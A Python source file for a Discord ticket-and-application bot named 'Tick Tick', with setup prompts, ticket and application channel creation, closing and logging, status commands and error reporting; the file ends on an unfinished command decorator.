import discord, chalk, asyncio, random, time, datetime, ast, os
from discord.ext import commands
from discord.ext.commands.cooldowns import BucketType

from datetime import datetime as dt

async def get_pre(bot, message):
    filepath = os.path.exists(f'./data/settings/{message.guild.id}-prefix.txt')
    if filepath == True:
        f = open(f'./data/settings/{message.guild.id}-prefix.txt', "r")
        data = f.read()
        f.close()

        return [data, "<@557154903563304960> "]
    else:
        return ["-", "<@557154903563304960> "]

bot = commands.Bot(command_prefix=get_pre, status=discord.Status.idle, activity=discord.Game(name="Starting up..."))
client = discord.Client()

bot.remove_command("help")

@bot.event
async def on_ready():
    global ver
    print(chalk.green("Ready to go!"))
    print(chalk.blue(f"Serving: {len(bot.guilds)} guilds."))
    await bot.change_presence(status=discord.Status.online, activity=discord.Game(name="-setup | updated to 1.0.0"))
    ver = "1.0.2"





@bot.command()
@commands.has_permissions(manage_messages=True)
async def clear(ctx, amount:int=None):
    await ctx.message.delete()
    if amount == None:
        await ctx.send("Please tell me an amount")
    else:
        await ctx.channel.purge(limit=amount)
        embed = discord.Embed(title=f"Cleared {amount} messages", colour=discord.Colour(0x9adc86))
        embed.set_footer(text="Message will delete in 10 seconds.")
        msg = await ctx.channel.send(embed=embed)
        await asyncio.sleep(1)
        embed.set_footer(text="Message will delete in 9 seconds.")
        await msg.edit(embed=embed)
        await asyncio.sleep(1)
        embed.set_footer(text="Message will delete in 8 seconds.")
        await msg.edit(embed=embed)
        await msg.edit(embed=embed)
        await asyncio.sleep(1)
        embed.set_footer(text="Message will delete in 7 seconds.")
        await msg.edit(embed=embed)
        await asyncio.sleep(1)
        embed.set_footer(text="Message will delete in 6 seconds.")
        await msg.edit(embed=embed)
        await asyncio.sleep(1)
        embed.set_footer(text="Message will delete in 5 seconds.")
        await msg.edit(embed=embed)
        await msg.edit(embed=embed)
        await asyncio.sleep(1)
        embed.set_footer(text="Message will delete in 4 seconds.")
        await msg.edit(embed=embed)
        await asyncio.sleep(1)
        embed.set_footer(text="Message will delete in 3 seconds.")
        await msg.edit(embed=embed)
        await asyncio.sleep(1)
        embed.set_footer(text="Message will delete in 2 seconds.")
        await msg.edit(embed=embed)
        await msg.edit(embed=embed)
        await asyncio.sleep(1)
        embed.set_footer(text="Message will delete in 1 seconds.")
        await msg.edit(embed=embed)     
        await asyncio.sleep(1)
   
        await msg.delete()



@bot.command()
@commands.has_permissions(administrator=True)
async def setup(ctx):
    global ver
    everyone = ctx.message.guild.default_role
    channel = ctx.channel
    async with channel.typing():

        embed = discord.Embed(title="Are you ready to set things up", description="This will take less than a minute, Reply with `yes` or `no`")
        
        embed.set_footer(text=f"Tick Tick | {ver}")
        msg = await ctx.send(embed=embed)

        channel = ctx.channel
        author = ctx.author

        def check(m):
            return m.channel == channel and m.author == author

        



        waited = await bot.wait_for('message', check=check)
        await waited.delete()
        await msg.delete()

        if waited.content == "yes" or waited.content == "Yes":
            embed = discord.Embed(title="Do you want me to setup all the categories and roles?", description="Reply with `yes` or `no`")

            embed.set_footer(text=f"Tick Tick | {ver}")
            msg = await ctx.send(embed=embed)

            waited = await bot.wait_for('message', check=check)

            await msg.delete()
            await waited.delete()

            if waited.content == "yes" or waited.content == "Yes":

                embed = discord.Embed(title="Creating everything for you", description="Just a second.") 

                embed.set_footer(text=f"Tick Tick | {ver}")
                msg = await ctx.send(embed=embed)

                guild = ctx.message.guild
                
                filepath = os.path.exists(f'./data/{ctx.message.guild.id}-channels.txt')

                if filepath == True:
                    f = open(f"./data/{ctx.message.guild.id}-channels.txt", "r")
                    data = f.read()
                    f.close()
                else:
                    data = None
                    
                    

                if data == None:
                    tickets = None
                    applications = None
                    logs = None

                else:
                    channels = ast.literal_eval(data)
                    tickets = channels["tickets"]
                    logs = channels["logs"]
                    applications = channels["applications"]
                
                if tickets == None:
                    ticketschannel = discord.utils.get(guild.categories, name="Tickets")
                    if ticketschannel == None:
                        overwrites = {
                            guild.default_role: discord.PermissionOverwrite(read_messages=False),
                            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                        }
                        ticketschannel = await guild.create_category_channel("Tickets", overwrites=overwrites)
                        tickets = ticketschannel.id
                    else:
                        tickets = ticketschannel.id

                if logs == None:
                    logschannel = discord.utils.get(guild.text_channels, name="Tickets")
                    if logschannel == None:
                        overwrites = {
                            guild.default_role: discord.PermissionOverwrite(read_messages=False),
                            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                        }
                        logschannel = await guild.create_text_channel("logs", overwrites=overwrites)
                        logs = logschannel.id
                    else:
                        logs = logschannel.id

                if applications == None:
                    applicationschannels = discord.utils.get(guild.categories, name="Applications")
                    if applicationschannels == None:
                        overwrites = {
                            guild.default_role: discord.PermissionOverwrite(read_messages=False),
                            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
                        }
                        applicationschannels = await guild.create_category_channel("Applications", overwrites=overwrites)
                        applications = applicationschannels.id
                    else:
                        applications = applicationschannels.id

                embed = discord.Embed(title="Creating everything for you", description="Just a second..") 

                embed.set_footer(text=f"Tick Tick | {ver}")
                await msg.edit(embed=embed)

                filepath = os.path.exists(f'./data/{ctx.message.guild.id}-roles.txt')


                if filepath == True:
                    f = open(f"./data/{ctx.message.guild.id}-roles.txt", "r")
                    data = f.read()
                    f.close()
                else:
                    data = None
                    

                if data == None:
                    support = None
                else:
                    channels = ast.literal_eval(data)
                    support = channels["support"]

                if support == None:
                    supportrole = discord.utils.get(guild.roles, name="Support")
                    if supportrole == None:
                        supportrole = await guild.create_role(name="Support")
                        support = supportrole.id
                    else:
                        support = supportrole.id



                
                embed = discord.Embed(title="Creating everything for you", description="Just a second...") 

                embed.set_footer(text=f"Tick Tick | {ver}")
                await msg.edit(embed=embed)
                await asyncio.sleep(1)
                embed = discord.Embed(title="Saving the data", description="Just a second.") 

                embed.set_footer(text=f"Tick Tick | {ver}")
                await msg.edit(embed=embed)

                f = open(f"./data/{ctx.message.guild.id}-channels.txt", "w")
                channels = {"tickets": tickets, "applications": applications, "logs" : logs}
                f.write(str(channels))
                f.close()

                embed = discord.Embed(title="Saving the data", description="Just a second..") 

                embed.set_footer(text=f"Tick Tick | {ver}")
                await msg.edit(embed=embed)

                f = open(f"./data/{ctx.message.guild.id}-roles.txt", "w")
                roles = {"support": support}
                f.write(str(roles))
                f.close()


                embed = discord.Embed(title="Saving the data", description="Just a second...") 

                embed.set_footer(text=f"Tick Tick | {ver}")
                await msg.edit(embed=embed)
                
                await asyncio.sleep(1)
                
                embed = discord.Embed(title="Done! Do you want custom messages?", description="Reply with `yes` or `no`") 

                embed.set_footer(text=f"Tick Tick | {ver}")
                await msg.delete()
                msg = await ctx.send(embed=embed)

                channel = ctx.channel
                author = ctx.author
                waited = await bot.wait_for('message', check=check)
                await waited.delete()
                await msg.delete()
                
                if waited.content == "Yes" or waited.content == "yes":
                    embed = discord.Embed(title="What should be the title when you open a new ticket", description="Reply with your answer, use `creator` to put the name of the creator of the ticket and `reason` for the reason and `reason` for the reason") 

                    embed.set_footer(text=f"Tick Tick | {ver}")
                    msg = await ctx.send(embed=embed)

                    waited = await bot.wait_for('message', check=check)

                    amount = len(waited.content)
                    await msg.delete()
                    await waited.delete()
                    if amount > 256:
                        await ctx.channel.send("Your title title cant be longer than 256")
                    else:
                        ticketheader = waited.content
                        embed = discord.Embed(title="What should be the description when you open a new ticket", description="Reply with your answer, use `creator` to put the name of the creator of the ticket and `reason` for the reason and `reason` for the reason") 

                        embed.set_footer(text=f"Tick Tick | {ver}")
                        
                        msg = await ctx.send(embed=embed)
                        waited = await bot.wait_for('message', check=check)

                        amount = len(waited.content)
                        await msg.delete()
                        await waited.delete()
                        
                        if amount > 256:
                            await ctx.channel.send("Your descrition cant be longer than 256")
                        else:
                            ticketdescription = waited.content

                            embed = discord.Embed(title="What should be the title when you open a new application", description="Reply with your answer, use `creator` to put the name of the creator of the application and `reason` for the reason") 

                            embed.set_footer(text=f"Tick Tick | {ver}")
                            
                            msg = await ctx.send(embed=embed)

                            waited = await bot.wait_for('message', check=check)

                            amount = len(waited.content)
                            await msg.delete()
                            await waited.delete()
                            if amount > 256:
                                await ctx.channel.send("Your title cant be longer than 256")
                            else:
                                appheader = waited.content

                                embed = discord.Embed(title="What should be the description when you open a new application", description="Reply with your answer, use `creator` to put the name of the creator of the application and `reason` for the reason") 

                                embed.set_footer(text=f"Tick Tick | {ver}")
                                
                                msg = await ctx.send(embed=embed)
                                waited = await bot.wait_for('message', check=check)

                                amount = len(waited.content)
                                await msg.delete()
                                await waited.delete()

                                if amount > 256:
                                    await ctx.channel.send("Your description cant be longer than 256")
                                else:
                                    appdescription = waited.content
                                    embed = discord.Embed(title="Saving the data", description="Just a second.") 

                                    embed.set_footer(text=f"Tick Tick | {ver}")
                                    
                                    msg = await ctx.send(embed=embed)
                                    filepath = os.path.exists(f'./data/{ctx.message.guild.id}-message-tickets.txt')
                                    if filepath == True:
                                        f = open(f"./data/{ctx.message.guild.id}-message-tickets.txt", "r")
                                        data = f.read()
                                        f.close()
                                        tickets = ast.literal_eval(data)
                                    else:
                                        tickets = None

                                    tickets = {
                                            "custom" : "True",
                                            "header" : ticketheader ,
                                            "description" : ticketdescription

                                        }
                                    f = open(f"./data/{ctx.message.guild.id}-message-tickets.txt", "w")
                                    f.write(str(tickets))
                                    f.close()

                                    embed = discord.Embed(title="Saving the data", description="Just a second..") 

                                    embed.set_footer(text=f"Tick Tick | {ver}")
                                    await msg.edit(embed=embed)

                                    filepath = os.path.exists(f'./data/{ctx.message.guild.id}-message-applications.txt')
                                    if filepath == True:
                                        f = open(f"./data/{ctx.message.guild.id}-message-applications.txt", "r")
                                        data = f.read()
                                        f.close()
                                        tickets = ast.literal_eval(data)
                                    else:
                                        applications = None

                                    applications = {
                                            "custom" : "True",
                                            "header" : appheader ,
                                            "description" : appdescription
                                        }

                                    f = open(f"./data/{ctx.message.guild.id}-message-applications.txt", "w")
                                    f.write(str(applications))
                                    f.close()
                                    embed = discord.Embed(title="Saving the data", description="Just a second...") 

                                    embed.set_footer(text=f"Tick Tick | {ver}")
                                    await msg.edit(embed=embed)

                                    asyncio.sleep(1)

                                    await msg.delete()

                                    embed = discord.Embed(title="Done! Your all setup", colour=discord.Colour(0x00ff7d), description="Your all done. Do -help for a list of commands") 

                                    embed.set_footer(text=f"Tick Tick | {ver}")
                                    
                                    msg = await ctx.send(embed=embed)




                    




                elif waited.content == "No" or waited.content == "no":
                    f = open(f"./data/{ctx.message.guild.id}-message-applications.txt", "w")
                    applications = {"custom": False}

                    f.write(str(applications))
                    f.close()
                    f = open(f"./data/{ctx.message.guild.id}-message-tickets.txt", "w")
                    tickets = {"custom": False}

                    f.write(str(tickets))
                    f.close()

                    embed = discord.Embed(title="Done!", description="Do `-help` for a list of commands") 

                    embed.set_footer(text=f"Tick Tick | {ver}")
                    await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(title="Error", colour=discord.Colour(0xff0000), description="``Ìnvalid response```") 

                    embed.set_footer(text=f"Tick Tick | {ver}")
                    await ctx.send(embed=embed)


            elif waited.content == "No" or waited.content == "no":
                
                embed = discord.Embed(title="This isnt fully supported yet...", description="Please use my automated system") 
 
                embed.set_footer(text=f"Tick Tick | {ver}")
                msg = await ctx.send(embed=embed)


        elif waited.content == "no" or waited.content == "No":
            embed = discord.Embed(title="Ok! Do -setup when your ready", description="Setup canled") 

            embed.set_footer(text=f"Tick Tick | {ver}")
            msg = await ctx.send(embed=embed)        
        else:
            embed = discord.Embed(title=f"Error! {waited.content} is not a valid response", colour=discord.Colour(0xff0000), description=f"Please do -setup to continue")

            embed.set_footer(text=f"Tick Tick | {ver}")
            await ctx.send(embed=embed)



@bot.command()
@commands.cooldown(1 , 60, BucketType.member) 
@commands.cooldown(1 , 10, BucketType.guild) 
async def new(ctx, *, reason=None):
    global ver
    if reason == None:
        embed = discord.Embed(title="Please tell us what you need", colour=discord.Colour(0xff0000), description="eg. -new Discord Bot")

        embed.set_footer(text=f"Tick Tick | {ver}")
        await ctx.channel.send(embed=embed)
    
    else:
        filepath = os.path.exists(f'./data/{ctx.message.guild.id}-channels.txt')
        if filepath == True:
            embed = discord.Embed(title="Opening your ticket", description="Just a sec.")

            embed.set_footer(text=f"Tick Tick | {ver}")
            msg = await ctx.send(embed=embed)


            f = open(f"./data/{ctx.message.guild.id}-channels.txt", "r")
            data = f.read()
            f.close()
            channels = ast.literal_eval(data)
            ticketsid = channels["tickets"]

            tickets = bot.get_channel(ticketsid)
            guild = ctx.message.guild
            filepath = os.path.exists(f'./data/{ctx.message.guild.id}-ticket-num.txt')
            if filepath == True:
                f = open(f"./data/{ctx.message.guild.id}-ticket-num.txt", "r")
                number_ = int(f.read())
                number_ += 1
                number_ = int(number_)
                number = int(number_)

                f.close()
            else:
                number = 1
            
            if number < 10:
                num = f"00{number}"
            elif number < 100:
                num = f"0{number}"
            else:
                num = number

            newchannel = await guild.create_text_channel(f"ticket-{num}", category=tickets)
            await newchannel.set_permissions(ctx.message.author, read_messages=True, send_messages=True)
            filepath = os.path.exists(f'./data/{ctx.message.guild.id}-message-tickets.txt')
            if filepath == True:
                f = open(f"./data/{ctx.message.guild.id}-message-tickets.txt", "r")
                data = f.read()
                f.close()
                messages = ast.literal_eval(data)

            else:
                embed = discord.Embed(title="Error", colour=discord.Colour(0xff0000), description="```Messages are not defined; contact an administrator```")

                embed.set_footer(text=f"Tick Tick | {ver}")
                await ctx.channel.send(embed=embed)

            custom = messages["custom"]
            if custom == False:
                embed = discord.Embed(title=f"Thank you for creating a ticket {ctx.author.name}", colour=discord.Colour(0xf6ff), description="We will get right back to you")

                embed.set_footer(text=f"Tick Tick | {ver}")
            else:
                title = messages["header"]
                title = title.replace("creator", ctx.author.name)
                title = title.replace("reason", reason)
                description = messages["description"]
                description = description.replace("creator", ctx.author.name)
                description = description.replace("reason", reason)

                embed = discord.Embed(title=title, colour=discord.Colour(0xf6ff), description=description)
                    
                embed.set_footer(text=f"Tick Tick | {ver}")

            await newchannel.send(embed=embed)
            embed = discord.Embed(title="Your channel has been sucsessfully created.", colour=discord.Colour(0xf6ff), description=f"Your ticket is located in {newchannel.mention}")
                    
            embed.set_footer(text=f"Tick Tick | {ver}")
            await msg.edit(embed=embed)

            filepath = os.path.exists(f'./data/{ctx.message.guild.id}-ticket-num.txt')

            f = open(f"./data/{ctx.message.guild.id}-ticket-num.txt", "w")
            f.write(str(number))
            f.close()
                


            ticketinfo = {
                    "guild" : ctx.guild.id,
                    "owner" : ctx.author.id ,
                    "reason" : reason,
                    "channelcreated" : ctx.channel.id,
                    "ticketnum" : num,
                    "ticketchannel" : newchannel.id,
                    "closed" : False
                }
            f = open(f"./data/tickets/{ctx.message.guild.id}-ticket-{num}.txt", "w")
            f.write(str(ticketinfo))
            f.close()
            
            



        else:
            embed = discord.Embed(title="Error", colour=discord.Colour(0xff0000), description="```Categories are not defined; contact an administrator```")

            embed.set_footer(text=f"Tick Tick | {ver}")
            await ctx.channel.send(embed=embed)




    

@bot.command()
async def close(ctx):
    channel = ctx.channel
    filepath = os.path.exists(f'./data/tickets/{ctx.message.guild.id}-{channel.name}.txt')
    if filepath == False:
        embed = discord.Embed(title="Error", colour=discord.Colour(0xff0000), description="```This channel is not a Ticket```")

        embed.set_footer(text=f"Tick Tick | {ver}")
        await ctx.send(embed=embed)
    else:
        filepath = os.path.exists(f'./data/{ctx.message.guild.id}-channels.txt')
        if filepath == False:
            embed = discord.Embed(title="Error", colour=discord.Colour(0xff0000), description="```The categories are improperly defined```")

            embed.set_footer(text=f"Tick Tick | {ver}")
            await ctx.send(embed=embed)
        else:
            f = open(f"./data/{ctx.message.guild.id}-channels.txt")
            data = f.read()
            f.close()
            channels = ast.literal_eval(data)
            cat = channels["tickets"]
            category = bot.get_channel(cat)
            if ctx.channel.category != category:
                embed = discord.Embed(title="Error", colour=discord.Colour(0xff0000), description="```This is not a ticket channel```")

                embed.set_footer(text=f"Tick Tick | {ver}")
                await ctx.channel.send(embed=embed)
            else:
                filepath = os.path.exists(f'./data/tickets/{ctx.message.guild.id}-{ctx.channel.name}.txt')
                if filepath == False:
                    embed = discord.Embed(title="Error", colour=discord.Colour(0xff0000), description="```This is not a ticket channel```")

                    embed.set_footer(text=f"Tick Tick | {ver}")
                    await ctx.send(embed=embed)
                else:
                    filepath = os.path.exists(f'./data/settings/{ctx.message.guild.id}-confirm.txt')
                    if filepath == False:
                        f = open(f"./data/tickets/{ctx.message.guild.id}-{ctx.channel.name}.txt", "r")
                        data = f.read()
                        data = ast.literal_eval(data)
                        f.close()
                        guild = data["guild"]
                        owner = data["owner"]
                        reason = data["reason"]
                        channelcreated = data["channelcreated"]
                        ticketnum = data["ticketnum"]
                        channelcreated = data["channelcreated"]
                        ticketchannel = data["ticketchannel"]
                        f = open(f"./data/tickets/{ctx.message.guild.id}-{ctx.channel.name}.txt", "w")
                        newdata = { 
                            'guild': guild, 
                            'owner': owner, 
                            'reason': reason, 
                            'channelcreated': channelcreated,
                            'ticketnum': ticketnum,
                            'ticketchannel': ticketchannel,
                            "closed" : True
                            }
                        f.write(str(newdata))
                        f.close()
                        f = open(f"./data/{ctx.message.guild.id}-channels.txt", "r")
                        data_ = f.read()
                        data = ast.literal_eval(data_)
                        f.close()
                        logs = data["logs"]
                        logschannel = bot.get_channel(logs)
                        embed = discord.Embed(title="Ticket closed", colour=discord.Colour(0xff0000), description=f"The ticket #ticket-{ticketnum} was closed")
                        embed.add_field(name=f"Name: ticket-{ticketnum}", value=f"Id: {ticketchannel}")
                        user = bot.get_user(owner)
                        embed.add_field(name=f"Owner: {user}", value=f"Id: {owner}")
                        embed.add_field(name=f"Reason for ticket:", value=f"{reason}")

                        embed.set_footer(text=f"Tick Tick | {ver}")                  
                        await logschannel.send(embed=embed)
                        embed = discord.Embed(title="Your ticket has been closed", colour=discord.Colour(0xff0000), description=f"Thank you for using {ctx.guild.name}")
                        await user.send(embed=embed)
                        await ctx.channel.delete()




@bot.command()
@commands.cooldown(1 , 60, BucketType.member) 
@commands.cooldown(1 , 10, BucketType.guild) 
async def apply(ctx, *, reason=None):
    global ver

    if reason == None:
        embed = discord.Embed(title="Please tell us what you need", colour=discord.Colour(0xff0000), description="eg. -new Discord Bot")

        embed.set_footer(text=f"Tick Tick | {ver}")
        await ctx.channel.send(embed=embed)
    
    else:

        filepath = os.path.exists(f'./data/{ctx.message.guild.id}-channels.txt')
        if filepath == True:
            embed = discord.Embed(title="Opening your application", description="Just a sec.")

            embed.set_footer(text=f"Tick Tick | {ver}")
            msg = await ctx.send(embed=embed)

            f = open(f"./data/{ctx.message.guild.id}-channels.txt", "r")
            data = f.read()
            f.close()
            channels = ast.literal_eval(data)
            ticketsid = channels["applications"]


            applications = bot.get_channel(ticketsid)
            guild = ctx.message.guild
            filepath = os.path.exists(f'./data/{ctx.message.guild.id}-application-num.txt')
            if filepath == True:
                f = open(f"./data/{ctx.message.guild.id}-application-num.txt", "r")
                number_ = int(f.read())
                number_ += 1
                number_ = int(number_)
                number = int(number_)

                f.close()
            else:
                number = 1
            
            if number < 10:
                num = f"00{number}"
            elif number < 100:
                num = f"0{number}"
            else:
                num = number

            newchannel = await guild.create_text_channel(f"application-{num}", category=applications)
            await newchannel.set_permissions(ctx.message.author, read_messages=True, send_messages=True)
            filepath = os.path.exists(f'./data/{ctx.message.guild.id}-message-applications.txt')
            if filepath == True:
                f = open(f"./data/{ctx.message.guild.id}-message-applications.txt", "r")
                data = f.read()
                f.close()
                messages = ast.literal_eval(data)

            else:
                embed = discord.Embed(title="Error", colour=discord.Colour(0xff0000), description="```Messages are not defined; contact an administrator```")

                embed.set_footer(text=f"Tick Tick | {ver}")
                await ctx.channel.send(embed=embed)

            custom = messages["custom"]
            if custom == False:
                embed = discord.Embed(title=f"Thank you for creating a application {ctx.author.name}", colour=discord.Colour(0xf6ff), description="We will get right back to you")

                embed.set_footer(text=f"Tick Tick | {ver}")
            else:
                title = messages["header"]
                title = title.replace("creator", ctx.author.name)
                title = title.replace("reason", reason)
                description = messages["description"]
                description = description.replace("creator", ctx.author.name)
                description = description.replace("reason", reason)

                embed = discord.Embed(title=title, colour=discord.Colour(0xf6ff), description=description)
                    
                embed.set_footer(text=f"Tick Tick | {ver}")

            await newchannel.send(embed=embed)
            embed = discord.Embed(title="Your channel has been sucsessfully created.", colour=discord.Colour(0xf6ff), description=f"Your application is located in {newchannel.mention}")
                    
            embed.set_footer(text=f"Tick Tick | {ver}")
            await msg.edit(embed=embed)

            filepath = os.path.exists(f'./data/{ctx.message.guild.id}-application-num.txt')

            f = open(f"./data/{ctx.message.guild.id}-application-num.txt", "w")
            f.write(str(number))
            f.close()
                


            ticketinfo = {
                    "guild" : ctx.guild.id,
                    "owner" : ctx.author.id ,
                    "reason" : reason,
                    "channelcreated" : ctx.channel.id,
                    "appnum" : num,
                    "appchannel" : newchannel.id,
                    "closed" : False
                }
            f = open(f"./data/applications/{ctx.message.guild.id}-application-{num}.txt", "w")
            f.write(str(ticketinfo))
            f.close()
            
            



        else:
            embed = discord.Embed(title="Error", colour=discord.Colour(0xff0000), description="```Categories are not defined; contact an administrator```")

            embed.set_footer(text=f"Tick Tick | {ver}")
            await ctx.channel.send(embed=embed)




    

@bot.command()
async def withdraw(ctx):
    name = ctx.channel.name
    channel = ctx.channel
    filepath = os.path.exists(f'./data/applications/{ctx.message.guild.id}-{channel.name}.txt')
    if filepath == False:
        embed = discord.Embed(title="Error", colour=discord.Colour(0xff0000), description="```This channel is not an application; exit 1```")

        embed.set_footer(text=f"Tick Tick | {ver}")
        await ctx.send(embed=embed)
    else:
        filepath = os.path.exists(f'./data/{ctx.message.guild.id}-channels.txt')
        if filepath == False:
            embed = discord.Embed(title="Error", colour=discord.Colour(0xff0000), description="```The categories are improperly defined; exit 2```")

            embed.set_footer(text=f"Tick Tick | {ver}")
            await ctx.send(embed=embed)
        else:
            f = open(f"./data/{ctx.message.guild.id}-channels.txt")
            data = f.read()
            f.close()
            channels = ast.literal_eval(data)
            cat = channels["applications"]
            category = bot.get_channel(cat)
            if ctx.channel.category != category:
                embed = discord.Embed(title="Error", colour=discord.Colour(0xff0000), description="```This is not an application channel; exit 3```")

                embed.set_footer(text=f"Tick Tick | {ver}")
                await ctx.send(embed=embed)
            else:
                filepath = os.path.exists(f'./data/applications/{ctx.message.guild.id}-{ctx.channel.name}.txt')
                if filepath == False:
                    embed = discord.Embed(title="Error", colour=discord.Colour(0xff0000), description="```This is not an application channel; exit 4```")

                    embed.set_footer(text=f"Tick Tick | {ver}")
                    await ctx.send(embed=embed)
                else:
                    filepath = os.path.exists(f'./data/settings/{ctx.message.guild.id}-confirm.txt')
                    if filepath == False:
                        f = open(f"./data/applications/{ctx.message.guild.id}-{ctx.channel.name}.txt", "r")
                        data = f.read()
                        data = ast.literal_eval(data)
                        f.close()
                        guild = data["guild"]
                        owner = data["owner"]
                        reason = data["reason"]
                        channelcreated = data["channelcreated"]
                        appnum = data["appnum"]
                        channelcreated = data["channelcreated"]
                        appchannel = data["appchannel"]
                        f = open(f"./data/applications/{ctx.message.guild.id}-{ctx.channel.name}.txt", "w")
                        newdata = { 
                            'guild': guild, 
                            'owner': owner, 
                            'reason': reason, 
                            'channelcreated': channelcreated,
                            'appnum': appnum,
                            'appchannel': appchannel,
                            "closed" : True
                            }
                        f.write(str(newdata))
                        f.close()
                        f = open(f"./data/{ctx.message.guild.id}-channels.txt", "r")
                        data_ = f.read()
                        data = ast.literal_eval(data_)
                        f.close()
                        logs = data["logs"]
                        logschannel = bot.get_channel(logs)
                        embed = discord.Embed(title="Ticket closed", colour=discord.Colour(0xff0000), description=f"The application #application-{appnum} was closed")
                        embed.add_field(name=f"Name: application-{appnum}", value=f"Id: {appchannel}")
                        user = bot.get_user(owner)
                        embed.add_field(name=f"Owner: {user}", value=f"Id: {owner}")
                        embed.add_field(name=f"Reason for application:", value=f"{reason}")

                        embed.set_footer(text=f"Tick Tick | {ver}")                  
                        await logschannel.send(embed=embed)
                        embed = discord.Embed(title="Your application has been closed", colour=discord.Colour(0xff0000), description=f"Thank you for using {ctx.guild.name}")
                        await user.send(embed=embed)
                        await ctx.channel.delete()



    
@bot.command()
async def bug(ctx, *, name):
    channel = bot.get_channel(557505096557264896)
    await ctx.send(f"Your bug has been sent to {channel.mention}")
    embed = discord.Embed(title=f"{ctx.message.author.name} reported a bug", colour=discord.Colour(0xffff), description=f"{name}")
    channel = bot.get_channel(557505096557264896)

    await channel.send(embed=embed)

@bot.command()
async def invite(ctx):
    global ver
    embed = discord.Embed(title="Invite the bot", colour=discord.Colour(0x29ff00), description="[Click here to invite the bot](https://discordapp.com/api/oauth2/authorize?client_id=557154903563304960&permissions=268823672&redirect_uri=https%3A%2F%2Fdiscord.gg%2FY5ereeE&scope=bot)")

    embed.set_footer(text=f"Tick tick | {ver}")
    await ctx.send(embed=embed)


@bot.command()
async def support(ctx):
    global ver
    embed = discord.Embed(title="Get support for the bot", colour=discord.Colour(0x29ff00), description="[Click here to go into our support server](https://discord.gg/Ks43Av4)")

    embed.set_footer(text=f"Tick tick | {ver}")
    await ctx.send(embed=embed)

@bot.command(aliases=["site"])
async def website(ctx):
    global ver
    embed = discord.Embed(title="This is our website", colour=discord.Colour(0x29ff00), description="[Click here to go to our website](https://tick-tick.netlify.com/)")

    embed.set_footer(text=f"Tick tick | {ver}")
    await ctx.send(embed=embed)

@bot.command()
async def setstatus(ctx, status, type, *, name):
    user = bot.get_user(445556389532925952)
    user2 = bot.get_user(394174323117654036)
    if ctx.message.author == user or ctx.message.author == user2:
        
        if type == "listening":
            if status == "Online":
                await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f"{name}"), status=discord.Status.online)
                await ctx.channel.send(f"Set the status to **Listening to {name}** and **Online**")
            elif status == "dnd":
                await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f"{name}"), status=discord.Status.dnd)
                await ctx.channel.send(f"Set the status to **Listening to {name}** and **DND**")
            elif status == "idle":
                await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f"{name}"), status=discord.Status.idle)
                await ctx.channel.send(f"Set the status to **Listening to {name}** and **Idle**")
            else:
                await ctx.send("Not a valid status")
        elif type == "watching":
            if status == "Online":
                await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{name}"), status=discord.Status.online)
                await ctx.channel.send(f"Set the status to **Watching to {name}** and **Online**")
            elif status == "dnd":
                await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{name}"), status=discord.Status.dnd)
                await ctx.channel.send(f"Set the status to **Watching to {name}** and **DND**")
            elif status == "idle":
                await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{name}"), status=discord.Status.idle)
                await ctx.channel.send(f"Set the status to **Watching to {name}** and **Idle**")
            else:
                await ctx.send("Not a valid status")
        elif type == "playing":
            if status == "Online":
                await bot.change_presence(activity=discord.Game(name=f"{name}"), status=discord.Status.online)
                await ctx.channel.send(f"Set the status to **Playing to {name}** and **Online**")
            elif status == "dnd":
                await bot.change_presence(activity=discord.Game(name=f"{name}"), status=discord.Status.dnd)
                await ctx.channel.send(f"Set the status to **Playing to {name}** and **DND**")
            elif status == "idle":
                await bot.change_presence(activity=discord.Game(name=f"{name}"), status=discord.Status.idle)
                await ctx.channel.send(f"Set the status to **Playing to {name}** and **Idle**")
        elif type == "show":
            if name == "guilds":
                await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching,name=f"{len(bot.guilds)} servers"))
                await ctx.channel.send(f"Set the status to **watching `guild amount` servers** and **Online**")
        else:
            await ctx.channel.send("Not a valid type of status")
    else:
        await ctx.channel.send("Oops, you cant to that")

@bot.command()
async def help(ctx):
    global ver
    embed = discord.Embed(title="Help for is still work in progress", colour=discord.Colour(0xffff), description="Use your prefix and then the command listed")

    embed.set_footer(text=f"Tick Tick | {ver}")

    embed.add_field(name="-new <name>", value="Makes a new ticket", inline=True)
    embed.add_field(name="-close", value="Closes an open ticket", inline=True)
    embed.add_field(name="-apply <job>", value="Applies you for a job", inline=True)
    embed.add_field(name="-withdraw", value="withdraws your application for a job", inline=True)
    await ctx.channel.send(embed=embed)

@bot.event
async def on_command_error(ctx, error):
    global ver

    if isinstance(error, commands.CommandNotFound):
        if ctx.message.content == "-resetprefix":
            return
        else:
            command = str(error)
            cmd = str(command.replace('Command "', " "))
            cmd = str(cmd.replace('" is not found', " "))

            embed = discord.Embed(title=f"Error! {cmd} is not a valid command", colour=discord.Colour(0xff0000), description=f"Do -help for a list of commands")

            embed.set_footer(text=f"Tick Tick | {ver}")
            await ctx.send(embed=embed)
    elif isinstance(error, commands.CommandOnCooldown):
        time = str(error)
        time = str(time.replace('You are on cooldown. Try again in "', " "))


        embed = discord.Embed(title=f"Error! You have to wait {time} before you can do that!", colour=discord.Colour(0xff0000), description=f"just wait {time} to do this command b")

        embed.set_footer(text=f"Tick Tick | {ver}")

        ctx.send(embed=embed)
    else:

        print(f"{error} happend in {ctx.channel}")
        embed = discord.Embed(title="Error! Something happend!", colour=discord.Colour(0xff0000), description=f"If this error happens a lot then report it in our support server using -support ```{error}```")

        embed.set_footer(text=f"Tick Tick | {ver}")
        await ctx.send(embed=embed)
        n = random.randint(1,23743852)
        f = open(f"./data/errors/{n}log.txt", "w")
        f.write(f"{error} happend in {ctx}")
        f.close()
        usererrors = bot.get_channel(561564616292040720)

        embed = discord.Embed(title="Error! Something happend!", colour=discord.Colour(0xff0000), description=f"This error just happend```{error}```")


        embed.add_field(name=f"In: {ctx.guild.name}", value=f"By: {ctx.message.author}")
        embed.set_footer(text=f"Tick Tick | {ver}")
        await usererrors.send(embed=embed)



@bot.command()
